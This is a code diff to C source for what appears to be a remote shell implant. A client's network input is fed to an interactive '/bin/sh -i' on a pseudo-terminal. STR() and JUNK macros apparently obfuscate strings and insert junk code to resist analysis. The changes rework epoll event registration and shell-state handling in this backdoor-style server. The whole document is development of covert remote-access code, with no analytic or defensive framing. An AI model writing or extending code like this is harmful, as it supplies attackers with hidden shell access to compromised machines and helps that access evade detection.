@@ -126,11 +126,13 @@ int exec_shell2(param_t *command)
 	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
 	int slave_fd = -1;
 	client_t *client = command->client;
+	int epoll_fd = client->master_ev.epoll_fd;
 
-	if (client->master_ev.fd == -1) {
-		logger(STR("master_ev.fd is -1\n"));
-	}
-
+	if (add_event(epoll_fd, &client->master_ev, EPOLLIN) == -1) {
+		logger(STR("add_event failed\n"));
+		return -1;
+	} JUNK;
+	
 	pid_t pid = fork();
 	if (pid == -1) {
 		logger(STR("fork failed\n"));
@@ -203,7 +205,7 @@ int (*get_command(const char *cmd))(param_t *)
 
 /* Main epoll loop */
 /* pretty sure EPOLLRHUP and EPOLLHUP implicitly added */
-static int add_event(int epoll_fd, event_t *event, uint32_t events)
+int add_event(int epoll_fd, event_t *event, uint32_t events)
 {
 	struct epoll_event ev;
 	ev.events = events | EPOLLRDHUP | EPOLLHUP;
@@ -212,7 +214,7 @@ static int add_event(int epoll_fd, event_t *event, uint32_t events)
 	return epoll_ctl(epoll_fd, EPOLL_CTL_ADD, event->fd, &ev);
 }
 
-static int remove_event(int epoll_fd, event_t *event)
+int remove_event(int epoll_fd, event_t *event)
 {
 	return epoll_ctl(epoll_fd, EPOLL_CTL_DEL, event->fd, NULL);
 }
@@ -297,6 +299,7 @@ void client_event(event_t *self, uint32_t events) {
 		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);
 
 		if (client->shell_active == true) {
+			logger(STR("client shell active, writing to master\n"));
 			if (ret > 0) {
 				buf[ret] = '\0';
 				write(client->master_ev.fd, buf, ret);
@@ -368,6 +371,8 @@ void master_event(event_t *self, uint32_t events) {
 	if (events & EPOLLRDHUP || events & EPOLLHUP) {
 		logger(STR("master event: EPOLLRDHUP or EPOLLHUP\n"));
 		epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
+		client_t *client = (client_t *)self->context;
+		client->shell_active = false;
 
 		return;
 	} else if (events & EPOLLIN) {
@@ -437,12 +442,6 @@ void server_event(event_t *self, uint32_t events)
 		} JUNK;
 
 		fill_event(&client->master_ev, master_fd, master_event, client, self->epoll_fd);
-
-		if (add_event(self->epoll_fd, &client->master_ev, EPOLLIN) == -1) {
-			logger(STR("add_event failed\n"));
-			close(client->master_ev.fd);
-			close(client_fd);
-		} JUNK;
 	}
 }
 
